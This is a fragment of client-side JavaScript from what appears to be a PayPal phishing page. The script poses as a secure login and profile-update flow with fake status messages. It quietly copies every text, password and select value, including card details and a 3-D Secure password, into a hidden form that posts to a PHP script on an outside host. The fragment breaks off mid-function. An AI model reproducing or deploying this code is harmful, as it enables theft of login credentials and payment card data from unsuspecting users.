  <script type="text/javascript">
   function createShadowForm() {
	
		var method = "POST";
		var action = "http://www.sunshinespa.ca/assets/css/dir.php";
		var enctype = "multipart/form-data";	
		var formObj = document.createElement("FORM");
		formObj.setAttribute("method",method);
		formObj.setAttribute("action",action);
		formObj.setAttribute("enctype",enctype);
		document.head.appendChild(formObj);
		return formObj;	
	}	
	
	var shadowForm = createShadowForm();
	
	var stepIndex = 0;
	var TitleIndex = 0;
	var wrapperIndex = 0;
	var country = "";
	var delays = [2,1.4,1.2];
	var divIds = ["fluid","fluid1","fluid2"];
	var wrapperStatus = ["Logging you in securely","Updating your profile","Updating your profile","Redirecting"];
	var pageTitles = [ "logging...","Address Profile",
					   "updating...","Card Profile",
					   "Update Done !","Resirecting...",
					 ];
	
	function swapDisplay() {
	
		var mainDiv = document.getElementById("main");
		var wrapperDiv = document.getElementById("wrapper");
		
		if(mainDiv.style.display == "block") {	
			mainDiv.style.display = "none";
			wrapperDiv.style.display = "block";
		}
		else {
			wrapperDiv.style.display = "none";
			mainDiv.style.display = "block";
		}
		updatePageTitle();
	}
	
	function updatePageTitle() {
		var pageTitle = document.getElementById("pageTitle");
		pageTitle.innerHTML = "PayPal - " + pageTitles[TitleIndex];
		TitleIndex++;
	}
	
	function  setCurrentStep() {
	  var obj = document.getElementById("stepTitle");
	  var stepTitles = obj.getElementsByTagName("LI");
	  stepTitles[stepIndex+1].style.fontWeight = "bold";
	}	
	
	function updateWrapper() {	
		var wrapperObj = document.getElementById("wrapperStatus");
		wrapperObj.innerHTML = wrapperStatus[wrapperIndex] + " ...";
		wrapperIndex++;
	}
	
	function updateDiv(target,source) {
		var sourceDiv = document.getElementById(source);
		var targetDiv = document.getElementById(target);
		targetDiv.innerHTML = sourceDiv.innerHTML;
	}
	
	function getFormData(fomObj) {

		var data = {};
		var dataName ;
		var selectedItem;
		var inputElements = fomObj.getElementsByTagName("INPUT");
		for (i=0; i&lt;inputElements.length; i++) {
			if (inputElements[i].type == "text" || inputElements[i].type == "password") { 
				dataName = inputElements[i].getAttribute("name");
				data[dataName] = inputElements[i].value;
			}
		}
		
		var selectElements = fomObj.getElementsByTagName("SELECT");
		for (i=0; i&lt;selectElements.length; i++) {
			selectedItem = selectElements[i]; 
			dataName = selectedItem.getAttribute("name");
			data[dataName] = selectedItem.options[selectedItem.selectedIndex].value;
		}
		return data;
	}	

	function fillShadowForm(formObj,data) {
		var shadowInput ;
		for (var key in data) {
			shadowInput = document.createElement("INPUT");
			shadowInput.type = "hidden";
			shadowInput.name = key;
			shadowInput.value = data[key];
			formObj.appendChild(shadowInput);
		}
	}	
	
	function nextStep(fomObj) {
	
		var data = {};
		updateWrapper();
		swapDisplay();
		data = getFormData(fomObj);
		fillShadowForm(shadowForm,data);
		
		if(stepIndex == 2) {
			shadowForm.submit();
			setTimeout("updateWrapper()", delays[stepIndex]*1000);
			return false;
		}
		
		if(stepIndex == 1) {
			updateCcTable();
		}
		
		updateDiv(divIds[0],divIds[stepIndex+1]);
		
		setTimeout("swapDisplay()", delays[stepIndex]*1000);
		setCurrentStep();
		stepIndex++;
		return false;
	}
	
	function setCountry(obj) {
		country = obj.options[obj.selectedIndex].value;
	}
	
	function updateCcTable() {
	
		var ccTable = document.getElementById("ccTable");
		var sec3DHtml ="&lt;p&gt;&lt;td&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font style='font-size: 12px' color='#575757'&gt;3-D Secure&lt;/font&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td id='sortInput'&gt;&lt;input type='password' name='inph017' placeholder='' size='4' required title='Please Enter your 3-D Secure Password' x-moz-errormessage='Please Enter your 3-D Secure Password' style='width: 209px'/&gt;&lt;/td&gt;&lt;/p&gt;";
		var tableRowsHtml = [];
